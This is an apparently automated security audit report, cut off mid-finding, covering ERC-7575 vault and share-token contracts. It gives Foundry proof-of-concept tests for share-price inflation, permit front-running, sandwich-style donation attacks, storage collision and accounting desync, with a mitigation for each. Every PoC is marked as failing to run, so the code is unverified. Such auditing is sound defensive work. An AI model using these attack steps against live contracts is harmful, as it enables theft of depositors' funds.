ERC4626SharePriceMismatch

## Exploit Type
ERC4626SharePrice

## Location
ShareTokenUpgradeable.convertNormalizedAssetsToShares

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `ShareTokenUpgradeable` uses `VIRTUAL_SHARES` and `VIRTUAL_ASSETS` constants set to `1e6` to mitigate inflation attacks. However, since the system normalizes all assets to 18 decimals, `1e6` (1 million wei) is extremely small relative to the token precision (1e18). An attacker can still manipulate the share price significantly by depositing a small amount and donating assets, as `1e6` offers negligible protection against 18-decimal shifts.

## Impact
Share price manipulation and potential theft of deposits from subsequent users.

## Command to Run Test


## Proof of Concept
1. Attacker deposits small amount to get 1 share.
2. Attacker donates 1 token (1e18 wei).
3. Share price becomes inflated (ratio ~1e12).
4. Next user deposits small amount, receives 0 shares due to rounding.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

// Mock Vault to control asset reporting
contract MockVault {
    uint256 public normalizedAssets;
    address public _asset;
    address public _share;

    constructor(address asset_, address share_) {
        _asset = asset_;
        _share = share_;
    }

    function setAssets(uint256 assets) external {
        normalizedAssets = assets;
    }

    function getClaimableSharesAndNormalizedAssets() external view returns (uint256, uint256) {
        // Return 0 claimable shares to keep circulating supply equal to total supply
        return (0, normalizedAssets);
    }
    
    // ERC7575 Interface compliance
    function asset() external view returns (address) { return _asset; }
    function share() external view returns (address) { return _share; }
}

contract InflationTest is Test {
    ShareTokenUpgradeable shareToken;
    MockVault vault;
    address attacker = address(0x1);

    function setUp() public {
        // Deploy ShareToken via Proxy
        ShareTokenUpgradeable impl = new ShareTokenUpgradeable();
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), abi.encodeCall(ShareTokenUpgradeable.initialize, ("Share", "SHR", address(this))));
        shareToken = ShareTokenUpgradeable(address(proxy));

        // Setup Mock Vault and Register
        vault = new MockVault(address(0x123), address(shareToken));
        shareToken.registerVault(address(0x123), address(vault));
    }

    function testInflationRounding() public {
        // 1. Simulate initial state: Attacker holds 1 share
        // We prune permissions to simulate vault minting
        vm.prank(address(vault));
        shareToken.mint(attacker, 1);
        
        // 2. Simulate Inflation: Attacker donates 2,000,000 tokens (normalized to 18 decimals)
        // This creates a 2M : 1 ratio of assets to shares
        // 2M tokens = 2 * 10^6 * 10^18 = 2e24
        vault.setAssets(2e24);

        // Verify state: Supply = 1, Assets = 2e24
        (uint256 supply, uint256 assets) = shareToken.getCirculatingSupplyAndAssets();
        assertEq(supply, 1);
        assertEq(assets, 2e24);

        // 3. Victim deposits 1 full token (1e18 normalized)
        // Calculation: 1e18 * (1 + 1e6) / (2e24 + 1e6) ≈ 1e24 / 2e24 < 1
        uint256 shares = shareToken.convertNormalizedAssetsToShares(1e18, Math.Rounding.Floor);
        
        // 4. Assert 0 shares received due to insufficient virtual offset (1e6)
        assertEq(shares, 0, "Victim receives 0 shares for 1 token deposit due to rounding");
        
        // 5. Demonstrate fix: With proper offset (1e18), victim would be safe
        uint256 properOffset = 1e18;
        uint256 safeShares = Math.mulDiv(1e18, supply + properOffset, assets + properOffset);
        // 1e18 * 1e18 / 2e24 = 1e36 / 2e24 = 1e12 shares
        assertTrue(safeShares > 0, "With proper offset, victim would get shares");
    }
}

## Suggested Mitigation
Increase virtual offset constants to a value comparable to the precision (e.g., `10**decimals()`).


## [H-8]. Phantom Liquidity and Insolvency via rBalance Pricing Mismatch

### Finding Severity Justification: The vulnerability demonstrates a critical disconnect between the Investment Layer's valuation logic and its liquidation mechanism. The `ShareTokenUpgradeable` calculates its Net Asset Value (NAV) and share price by including `rBalance` (which represents invested/loaned capital in the Settlement Layer). However, the only mechanism available to the Investment Manager to retrieve liquidity (`withdrawFromInvestment`) calls the Settlement Layer's `redeem` function. The Settlement Layer's `redeem` function strictly burns liquid `balanceOf` shares and cannot process or burn `rBalance`. This creates a state of 'Phantom Liquidity' where the protocol reports solvency and asset backing based on `rBalance`, but allows no mechanical way to realize that value to satisfy withdrawals. If a significant portion of assets are deployed (converted to `rBalance`), user withdrawals will revert, effectively causing a Denial of Service on funds. This fits the criteria for High severity as it involves the freezing of assets due to accounting/logic mismatch.
## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
AccountingInvariantViolation

## Location
ShareTokenUpgradeable.getInvestedAssets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `ShareTokenUpgradeable` calculates its total assets (`getInvestedAssets`) by summing its balance of settlement tokens (`WERC7575ShareToken`) and its restricted balance (`rBalance`). This combined value determines the share price for deposits and redemptions. However, `rBalance` in `WERC7575ShareToken` represents 'invested' or 'restricted' capital that cannot be transferred or burned via the standard `redeem` function of the settlement vault. When an investor tries to redeem shares from `ShareTokenUpgradeable`, the Investment Manager calls `withdrawFromInvestment`, which attempts to `redeem` from the settlement vault. The settlement vault burns `WERC7575ShareToken` from the `ShareTokenUpgradeable`'s standard balance. It does NOT burn `rBalance`. If a significant portion of the `ShareTokenUpgradeable`'s value is held in `rBalance` (e.g., accrued profits not yet realized into liquid balances), the system reports a high share price but lacks the liquid, burnable shares to satisfy redemptions. This leads to insolvency where the last users to exit are left with 'phantom' value that cannot be redeemed.

## Impact
High. The protocol reports solvency based on `rBalance` (Restricted Balance), creating 'Phantom Liquidity'. Users see a valid share price and balance, but redemptions revert because the underlying assets are locked in a non-burnable state. This effectively freezes user funds until a trusted Validator explicitly unwinds the restricted position, leading to a Denial of Service on withdrawals.

## Command to Run Test


## Proof of Concept
1. **Setup**: User deposits assets into `ERC7575VaultUpgradeable` (User Vault). Investment Manager (IM) fulfills deposit; User gets shares.
2. **Investment**: IM calls `investAssets`. User Vault sends assets to `WERC7575Vault` (Settlement Vault). `ShareTokenUpgradeable` (User Share) receives `WERC7575ShareToken` (Settlement Share).
3. **Deployment (Locking)**: Validator calls `rBatchTransfers` on Settlement Share to deploy capital. This moves `ShareTokenUpgradeable`'s funds from `_balances` (liquid) to `_rBalances` (restricted).
4. **Phantom State**: `ShareTokenUpgradeable.getInvestedAssets()` still reports full value (Liquid + Restricted), so User Share NAV remains high.
5. **Denial of Service**: User requests redeem. IM calls `withdrawFromInvestment`. This triggers `SettlementVault.redeem`.
6. **Failure**: `SettlementVault` attempts to burn `SettlementShare` from `ShareTokenUpgradeable`. The burn function only checks liquid `_balances`. Since `_balances` is 0 (all funds in `_rBalances`), the transaction reverts. User cannot exit.

## Proof of Code
import "forge-std/Test.sol";
import "../src/WERC7575Vault.sol";
import "../src/WERC7575ShareToken.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "../src/ShareTokenUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") { _mint(msg.sender, 1000000 * 10**18); }
    function decimals() public pure override returns (uint8) { return 6; }
}

contract PhantomLiquidityTest is Test {
    MockERC20 asset;
    WERC7575ShareToken wShare; // Settlement Share
    WERC7575Vault wVault;      // Settlement Vault
    ShareTokenUpgradeable uShare; // User Share
    ERC7575VaultUpgradeable uVault; // User Vault
    
    address owner = address(1);
    address validator = address(2);
    address im = address(4);
    address user = address(5);
    address carrier = address(6);

    function setUp() public {
        vm.startPrank(owner);
        asset = new MockERC20();
        
        // 1. Deploy Settlement Layer
        wShare = new WERC7575ShareToken("WERC", "WERC");
        wShare.setValidator(validator);
        wVault = new WERC7575Vault(address(asset), wShare);
        wShare.registerVault(address(asset), address(wVault));
        
        // 2. Deploy User Layer
        uShare = new ShareTokenUpgradeable();
        uShare.initialize("USR", "USR", owner);
        uVault = new ERC7575VaultUpgradeable();
        uVault.initialize(IERC20Metadata(address(asset)), address(uShare), owner);
        uShare.registerVault(address(asset), address(uVault));
        uShare.setInvestmentManager(im);
        uShare.setInvestmentShareToken(address(wShare));
        
        // 3. KYC Setup
        wShare.setKycAdmin(owner);
        wShare.setKycVerified(address(uShare), true);
        wShare.setKycVerified(address(uVault), true);
        wShare.setKycVerified(carrier, true);
        vm.stopPrank();
        
        asset.transfer(user, 1000 * 10**6);
    }

    function test_phantom_liquidity() public {
        // 1. User deposits
        vm.startPrank(user);
        asset.approve(address(uVault), 1000e6);
        uVault.requestDeposit(1000e6, user, user);
        vm.stopPrank();

        // 2. IM fulfills
        vm.prank(im);
        uVault.fulfillDeposit(user, 1000e6);
        vm.prank(user);
        uVault.deposit(1000e6, user);

        // 3. IM Invests (Liquid Assets -> Settlement Vault)
        vm.prank(im);
        uVault.investAssets(1000e6);
        
        // Verify liquid balance
        assertEq(wShare.balanceOf(address(uShare)), 1000e18);

        // 4. SIMULATE DEPLOYMENT: Validator moves balance to rBalance
        // This mimics funds being locked in a telecom deal
        address[] memory debtors = new address[](1); debtors[0] = address(uShare);
        address[] memory creditors = new address[](1); creditors[0] = carrier;
        uint256[] memory amounts = new uint256[](1); amounts[0] = 1000e18;
        
        // Flag 1 at bit 0 means debtor (uShare) gets rBalance increase
        uint256 flags = 1; 

        vm.prank(validator);
        wShare.rBatchTransfers(debtors, creditors, amounts, flags);

        // 5. Verify Phantom State: No liquid balance, but full rBalance
        assertEq(wShare.balanceOf(address(uShare)), 0);
        assertEq(wShare.rBalanceOf(address(uShare)), 1000e18);
        // NAV sees the rBalance as value
        assertEq(uShare.getInvestedAssets(), 1000e18);

        // 6. User attempts redeem -> FAIL
        vm.prank(user);
        uVault.requestRedeem(1000e18, user, user);
        
        vm.startPrank(im);
        // Expect revert because wVault.redeem tries to burn liquid balance
        vm.expectRevert(); 
        uVault.withdrawFromInvestment(1000e6);
        vm.stopPrank();
    }
}

## Suggested Mitigation
The protocol must acknowledge that `rBalance` is illiquid and cannot be used for immediate redemptions. Two changes are recommended:
1. **Smart Contract**: Update `withdrawFromInvestment` in `ERC7575VaultUpgradeable` to explicitly check the *liquid* balance (`balanceOf`) of the investment share token. If insufficient, revert with a distinct `IlliquidInvestment` error rather than a generic burn failure.
2. **Operational/Logic**: The Investment Manager must monitor liquid vs. restricted balances. Redemptions should only be fulfilled up to the amount of `liquidInvestedAssets` (standard balance) plus local vault assets. Do not include `rBalance` in `maxWithdraw` or redemption availability calculations unless a mechanism exists (e.g., calling the Validator) to atomically unwind `rBalance` to `balanceOf`.





 **Derived From** : StorageCollisionOrSelectorClash

## [H-9]. Storage Collision Risk via Non-Upgradeable ReentrancyGuard in Upgradeable Contract

### Finding Severity Justification: The contract `ERC7575VaultUpgradeable` is intended to be upgradeable (inheriting `Initializable`, `Ownable2StepUpgradeable`, etc.) but inherits the non-upgradeable `ReentrancyGuard` from `@openzeppelin/contracts`. This introduces two critical issues: 1) **Storage Layout Violation**: The non-upgradeable `ReentrancyGuard` occupies Storage Slot 0 for `_status`. This breaks the ERC-7201 namespaced storage pattern used by the other OpenZeppelin 5.0 upgradeable components. This creates a latent 'storage collision' trap; any future upgrade that introduces a state variable at Slot 0 (the default for new variables) will corrupt the reentrancy status, leading to potential theft or DOS. 2) **Initialization Failure**: The standard `ReentrancyGuard` sets `_status` in its constructor, which does not execute on the proxy's storage. Consequently, `_status` remains uninitialized (0) in the proxy. While the logic coincidentally prevents reentrancy (0 != 2), the contract is operating in an undefined state. Per the 'What IS In Scope' section, 'Storage corruption in upgrades' is explicitly listed as a High severity issue.
## Derived From Pattern/Invariant
StorageCollisionOrSelectorClash

## Exploit Type
StorageLayout

## Location
ERC7575VaultUpgradeable.inheritance

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`ERC7575VaultUpgradeable` inherits OpenZeppelin's non-upgradeable `ReentrancyGuard`. This contract uses storage slot 0 for its `_status` variable. While the other inherited contracts (OZ 5.0 Upgradeable) use namespaced storage (ERC-7201), relying on slot 0 in an upgradeable proxy context is unsafe. Future upgrades or added variables could collide with slot 0. Additionally, the `_status` is not initialized in the proxy storage (0), so the first call passes `0 != 2`, setting it to `2`, then `1`. While the lock technically works, the pattern is unsafe for upgradeable systems.

## Impact
High. The contract inherits the non-upgradeable `ReentrancyGuard`, causing the `_status` variable to occupy Storage Slot 0. This violates the intended ERC-7201 namespaced storage pattern of the upgradeable system. If a future upgrade introduces a standard state variable (which would default to Slot 0), it will inherit the reentrancy status value (1 or 2), leading to state corruption. Conversely, writing to that new variable could overwrite the reentrancy guard, causing a permanent Denial of Service (locking functions) or bypassing reentrancy protection.

## Command to Run Test


## Proof of Concept
1. Deploy `ERC7575VaultUpgradeable` (V1) behind an ERC1967 proxy.
2. Call `requestDeposit` (a `nonReentrant` function) to ensure the reentrancy guard executes, setting Slot 0 to `1` (`_NOT_ENTERED`).
3. Deploy a V2 implementation that attempts to fix the inheritance (switching to `ReentrancyGuardUpgradeable`) but adds a new state variable `uint256 public val;` at the contract level.
4. Upgrade the proxy to V2.
5. Observe that `val` equals `1` immediately after upgrade, proving that the previous implementation polluted Storage Slot 0.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {ReentrancyGuardUpgradeable} from "@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol";

// Mock V2 that fixes inheritance but adds a variable at Slot 0
contract VaultV2 is ReentrancyGuardUpgradeable {
    uint256 public corruptedSlot0; // Occupies Slot 0 in standard layout
}

contract StorageCollisionTest is Test {
    ERC7575VaultUpgradeable implementation;
    ERC1967Proxy proxy;
    address vaultAddress;
    address asset = makeAddr("asset");
    address share = makeAddr("share");

    function setUp() public {
        vm.mockCall(asset, abi.encodeWithSelector(IERC20Metadata.decimals.selector), abi.encode(18));
        vm.mockCall(share, abi.encodeWithSelector(IERC20Metadata.decimals.selector), abi.encode(18));
        // Mock operator check
        vm.mockCall(share, abi.encodeWithSignature("isOperator(address,address)", address(this), address(this)), abi.encode(true));
        // Mock balance
        vm.mockCall(asset, abi.encodeWithSelector(IERC20Metadata.balanceOf.selector), abi.encode(10000e18));
        vm.mockCall(asset, abi.encodeWithSelector(IERC20Metadata.transferFrom.selector), abi.encode(true));

        implementation = new ERC7575VaultUpgradeable();
        proxy = new ERC1967Proxy(address(implementation), "");
        vaultAddress = address(proxy);
        ERC7575VaultUpgradeable(vaultAddress).initialize(IERC20Metadata(asset), share, address(this));
    }

    function testStorageCollision() public {
        // 1. Trigger ReentrancyGuard to ensure _status is set
        // Default 0 -> enters (2) -> exits (1). Slot 0 becomes 1.
        ERC7575VaultUpgradeable(vaultAddress).requestDeposit(100e18, address(this), address(this));

        // Verify Slot 0 is 1 (_NOT_ENTERED)
        bytes32 slot0 = vm.load(vaultAddress, bytes32(uint256(0)));
        assertEq(uint256(slot0), 1, "Slot 0 should be occupied by ReentrancyGuard");

        // 2. Upgrade to V2
        VaultV2 v2 = new VaultV2();
        ERC7575VaultUpgradeable(vaultAddress).upgradeTo(address(v2));

        // 3. Check for corruption
        // V2's 'corruptedSlot0' maps to Slot 0. It should inherit the value 1 from V1.
        uint256 val = VaultV2(vaultAddress).corruptedSlot0();
        assertEq(val, 1, "V2 variable corrupted by V1 storage layout");
    }
}

## Suggested Mitigation
1. Import `ReentrancyGuardUpgradeable` from `@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol` instead of the standard library.
2. Update the contract inheritance to `ReentrancyGuardUpgradeable`.
3. Add `__ReentrancyGuard_init();` to the `initialize` function.





 **Derived From** : PermitFrontRun

## [L-10]. Permit Front-Running DoS in WERC7575ShareToken

### Finding Severity Justification: This is a standard 'Permit Front-Running' griefing vector. While the attacker can cause the user's specific transaction (permit + transfer) to revert by consuming the nonce, the user's intent (setting the allowance) is actually fulfilled by the attacker's front-running transaction. The user can recover by simply submitting the 'transfer' transaction again without the 'permit' call. The attacker gains no profit and must pay gas for every blocked transaction. Furthermore, the core 'Settlement' functionality (batchTransfers) uses a validator-only flow that does not rely on user permits, so the protocol's main function is not disrupted. This affects only individual user withdrawals, classifying it as a temporary DoS/Griefing issue (Low severity).
## Derived From Pattern/Invariant
PermitFrontRun

## Exploit Type
Dos

## Location
WERC7575ShareToken.permit

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `WERC7575ShareToken` relies heavily on `permit` for transfers (self-allowance requirement). The `permit` function allows anyone to submit a valid signature. An attacker can front-run a user's transaction containing a `permit` call by submitting the same signature directly. The attacker's transaction consumes the nonce, causing the user's batch transaction (permit + transfer) to revert. Given the mandatory nature of permits in this protocol, this constitutes a significant denial of service vector.

## Impact
Denial of Service for user transactions that batch `permit` and `transfer` operations. While the allowance is successfully set by the attacker's front-running transaction, the user's specific batch transaction reverts due to the nonce mismatch, forcing them to resubmit the `transfer` separately.

## Command to Run Test


## Proof of Concept
1. User signs a `permit` for self-allowance (validator signature).
2. User broadcasts a batch transaction containing `permit(...)` followed by `transfer(...)`.
3. Attacker observes the pending transaction, extracts the signature, and broadcasts a standalone `permit(...)` transaction with higher gas.
4. Attacker's transaction confirms first, consuming the user's nonce and setting the allowance.
5. User's batch transaction executes. The `permit` call fails because the nonce has already been used (signature invalid), causing the entire batch (including the transfer) to revert.

## Proof of Code
function testPermitFrontRun() public {
    // Setup: Deploy token and configure roles
    WERC7575ShareToken token = new WERC7575ShareToken("Wrapped USDT", "WUSDT");
    uint256 validatorPk = 0xA11CE;
    address validatorAddr = vm.addr(validatorPk);
    token.setValidator(validatorAddr);
    
    uint256 userPk = 0xB0B;
    address userAddr = vm.addr(userPk);
    token.setKycVerified(userAddr, true);

    // 1. Prepare Permit Data
    address owner = userAddr;
    address spender = userAddr; // Self-allowance case
    uint256 value = 100 ether;
    uint256 nonce = token.nonces(owner);
    uint256 deadline = block.timestamp + 1 days;

    // 2. Generate Signature (Validator signs for self-allowance)
    bytes32 PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonce, deadline));
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);

    // 3. Attacker Front-Runs
    // Attacker submits the permit signature before the user
    token.permit(owner, spender, value, deadline, v, r, s);

    // Assertions: Allowance is set, Nonce is incremented
    assertEq(token.allowance(owner, spender), value);
    assertEq(token.nonces(owner), nonce + 1);

    // 4. User Transaction Reverts
    // When the user's original tx (or batch) attempts to use the same signature, it fails
    vm.expectRevert(); // Reverts due to InvalidSigner (nonce mismatch)
    token.permit(owner, spender, value, deadline, v, r, s);
}

## Suggested Mitigation
Wrap `permit` call in a `try/catch` block within batching contracts, or advise users to use atomic relayers that prevent front-running.





 **Derived From** : ERC7575VaultUpgradeable.activeDepositRequesters

## [M-11]. State Desynchronization in `activeDepositRequesters` via `cancelDepositRequest`

### Finding Severity Justification: The finding identifies a valid state desynchronization where users with claimable assets are incorrectly removed from the `activeDepositRequesters` set upon cancelling a pending request. This violates the protocol's tracking logic established in `deposit`/`mint` functions, which keep users in the set until all assets are claimed. While this does not directly lock funds (as `getControllerStatus` remains correct and `unregisterVault` has a secondary balance check), it corrupts the registry of active users, potentially causing users to disappear from monitoring dashboards and leading to abandoned funds due to lack of visibility. This fits the criteria for Medium severity (Operational impact / State corruption affecting protocol function).
## Derived From Pattern/Invariant
ERC7575VaultUpgradeable.activeDepositRequesters

## Exploit Type
EventConsistency

## Location
ERC7575VaultUpgradeable.cancelDepositRequest

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `activeDepositRequesters` set is used to track users with active requests for off-chain monitoring and potentially batch processing. The invariant requires a user to be in this set if they have *either* pending OR claimable assets. 

The `cancelDepositRequest` function removes the user from `activeDepositRequesters` unconditionally after cancelling a pending request. However, it fails to check if the user still holds `claimableDepositAssets` (e.g., from a previous partial fulfillment). This leads to a state where a user has claimable assets but is invisible to off-chain watchers relying on `getActiveDepositRequesters`.

## Impact
Operational impact. Users with claimable funds may disappear from UI dashboards or off-chain notifications, leading to unclaimed funds stuck in the contract until the user manually intervenes without UI prompts.

## Command to Run Test


## Proof of Concept
1. User requests deposit of 100.
2. Manager fulfills 50. User has 50 Pending, 50 Claimable.
3. User calls `cancelDepositRequest` for the remaining 50 Pending.
4. Function executes `$.activeDepositRequesters.remove(user)`.
5. User still has 50 Claimable, but `activeDepositRequesters.contains(user)` is now false.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1000000 * 10**18);
    }
}

contract StateDesyncTest is Test {
    ERC7575VaultUpgradeable vault;
    ShareTokenUpgradeable shareToken;
    MockToken asset;
    
    address user = address(0x1);
    address manager = address(0x2);
    address owner = address(this);

    function setUp() public {
        asset = new MockToken();
        shareToken = new ShareTokenUpgradeable();
        shareToken.initialize("Share", "SHR", owner);
        
        vault = new ERC7575VaultUpgradeable();
        vault.initialize(IERC20Metadata(address(asset)), address(shareToken), owner);
        
        // Register vault in share token to allow minting
        shareToken.registerVault(address(asset), address(vault));
        
        // Setup investment manager role
        vault.setInvestmentManager(manager);
        
        // Fund user
        asset.transfer(user, 1000 * 10**18);
    }

    function testActiveRequesterDesync() public {
        uint256 depositAmount = 100 * 10**18;
        
        // 1. User requests deposit of 100
        vm.startPrank(user);
        asset.approve(address(vault), depositAmount);
        vault.requestDeposit(depositAmount, user, user);
        vm.stopPrank();

        // Verify user is active
        address[] memory activeInitial = vault.getActiveDepositRequesters();
        assertEq(activeInitial.length, 1);
        assertEq(activeInitial[0], user);

        // 2. Manager partially fulfills (50%)
        vm.prank(manager);
        vault.fulfillDeposit(user, depositAmount / 2);

        // 3. User cancels remaining pending request (50)
        vm.prank(user);
        vault.cancelDepositRequest(0, user);

        // 4. Verify State Desynchronization
        // User has claimable assets (from the partial fulfill)
        uint256 claimable = vault.claimableDepositRequest(0, user);
        assertEq(claimable, depositAmount / 2, "User should have claimable assets");
        
        // BUT user has been incorrectly removed from active set
        address[] memory activeAfter = vault.getActiveDepositRequesters();
        assertEq(activeAfter.length, 0, "VULNERABILITY: User removed from active set despite having claimable assets");
    }
}

## Suggested Mitigation
In `cancelDepositRequest`, only remove the controller from `activeDepositRequesters` if `claimableDepositAssets[controller] == 0`.





 **Derived From** : SlippageMissingOrInsufficient

## [M-12]. Missing Slippage Protection in Fulfillment and Investment Operations

### Finding Severity Justification: The lack of slippage protection (minShares/minAssets) in `fulfillDeposit`, `investAssets`, and `withdrawFromInvestment` exposes the protocol and users to value loss via sandwich attacks or exchange rate manipulation. While the Investment Manager is a trusted role, they cannot safely execute these transactions on a public mempool without these parameters, as they cannot enforce a minimum execution price on-chain. This aligns with C4's criteria for Medium severity: 'Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack vector with stated assumptions, but external requirements.' and the specific Gate 8 exception for missing standard protections.
## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
ERC7575VaultUpgradeable.fulfillDeposit

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
Multiple critical functions lack slippage protection:
1. `fulfillDeposit` converts assets to shares using the spot price without a `minShares` check.
2. `investAssets` deposits into an external vault without a `minShares` check.
3. `withdrawFromInvestment` redeems from an external vault without a `minAssets` check.
This exposes users and the vault to sandwich attacks or value loss if the exchange rate is manipulated (e.g., via the donation attack described elsewhere) or if the external investment vault suffers from slippage/manipulation.

## Impact
Loss of user funds (on deposit) or vault treasury (on investment operations) due to unfavorable exchange rates or sandwich attacks.

## Command to Run Test


## Proof of Concept
The vulnerability relies on the Investment Manager's transaction being visible in the public mempool, allowing an attacker to sandwich it. 

1. **Setup**: A user has a large `pendingDepositRequest` of 10,000 USDC waiting to be fulfilled.
2. **Observation**: The attacker monitors the mempool and observes the Investment Manager broadcasting a `fulfillDeposit(user, 10000e6)` transaction.
3. **Front-Run (Attack)**: The attacker submits a transaction with a higher gas price to 'donate' a significant amount of assets (e.g., 10,000 USDC) directly to the Vault. This artificially inflates the `totalAssets()` (since pending deposits are excluded, but donations are not) and thus the `totalNormalizedAssets` in the ShareToken, while the circulating share supply remains constant.
4. **Execution**: The Manager's `fulfillDeposit` transaction executes. The share calculation `shares = assets * supply / totalAssets` now uses the inflated denominator. The user receives significantly fewer shares than fair value.
5. **Back-Run (Profit/Grief)**: The attacker effectively dilutes the new depositor. While a direct profit requires holding shares beforehand (to benefit from the dilution) or unwinding a position, this clearly demonstrates value loss for the depositor due to lack of slippage protection.

## Proof of Code
import {Test, console} from "forge-std/Test.sol";
import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1_000_000e18);
    }
}

contract SlippageTest is Test {
    ERC7575VaultUpgradeable vault;
    ShareTokenUpgradeable shareToken;
    MockERC20 asset;

    address owner = address(1);
    address manager = address(2);
    address user = address(3);
    address attacker = address(4);

    function setUp() public {
        vm.startPrank(owner);
        asset = new MockERC20();
        shareToken = new ShareTokenUpgradeable();
        shareToken.initialize("Share", "SHR", owner);
        
        vault = new ERC7575VaultUpgradeable();
        vault.initialize(asset, address(shareToken), owner);
        
        shareToken.registerVault(address(asset), address(vault));
        vault.setInvestmentManager(manager);
        vm.stopPrank();

        asset.transfer(user, 1000e18);
        asset.transfer(attacker, 1000e18);
        
        // Seed vault with initial dust to establish supply
        vm.prank(owner);
        asset.transfer(address(vault), 1e18);
    }

    function testSandwichFulfillDeposit() public {
        uint256 depositAmount = 100e18;

        // 1. User requests deposit
        vm.startPrank(user);
        asset.approve(address(vault), depositAmount);
        vault.requestDeposit(depositAmount, user, user);
        vm.stopPrank();

        // 2. Attacker front-runs manager by donating assets to inflate totalAssets
        // This increases the denominator in the share calculation
        vm.startPrank(attacker);
        uint256 donationAmount = 100e18; // 1:1 donation to existing deposits causes 50% slippage roughly
        asset.transfer(address(vault), donationAmount);
        vm.stopPrank();

        // 3. Manager fulfills deposit
        vm.startPrank(manager);
        uint256 sharesReceived = vault.fulfillDeposit(user, depositAmount);
        vm.stopPrank();

        // 4. Assert slippage occurred
        // Without donation, 100 asset deposit into ~1 asset vault -> ~100 shares (simplified)
        // With donation of 100, vault has 101 assets. 
        // Share calculation: roughly assets * supply / totalAssets
        // The donation dilutes the new shares minted.
        
        // Note: Exact math depends on virtual shares/assets in ShareToken, but drop is significant.
        console.log("Shares Received:", sharesReceived);
        
        // Check that shares are significantly less than the deposited amount 
        // (assuming 1:1 roughly due to setup)
        assertLt(sharesReceived, depositAmount * 9 / 10, "Slippage exceeded 10%");
    }
}

## Suggested Mitigation
Update the critical functions to accept slippage parameters. 

1. Update `fulfillDeposit` to `fulfillDeposit(address controller, uint256 assets, uint256 minShares)`. Revert if the calculated shares are less than `minShares`.
2. Update `investAssets` to `investAssets(uint256 amount, uint256 minShares)`. Ensure the `minShares` are passed to or checked against the result of the external investment vault deposit.
3. Update `withdrawFromInvestment` to `withdrawFromInvestment(uint256 amount, uint256 minAssets)`. Ensure the actual assets received are at least `minAssets`.

Note: The `fulfillDeposits` (batch) function should also accept a `minShares[]` array to enforce limits per request.


## [M-13]. Missing Slippage Protection in Investment Operations

### Finding Severity Justification: The finding highlights a standard DeFi vulnerability: missing slippage protection when interacting with external yield-bearing vaults. In `investAssets`, the protocol deposits assets without a `minShares` check, and in `withdrawFromInvestment`, it redeems shares based on `previewWithdraw` without a `maxShares` limit or `minAssets` check. This exposes the protocol to value loss via sandwich attacks or unfavorable market fluctuations during the transaction. C4 consistently categorizes missing slippage protection on external vault interactions as Medium severity.
## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
ERC7575VaultUpgradeable.investAssets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `investAssets` and `withdrawFromInvestment` functions interact with external investment vaults to deposit/withdraw assets. These functions lack a `minShares` or `minAssets` parameter to enforce slippage protection. If the investment vault's exchange rate fluctuates unfavorably (or is manipulated) during the transaction, the protocol suffers value loss.

## Impact
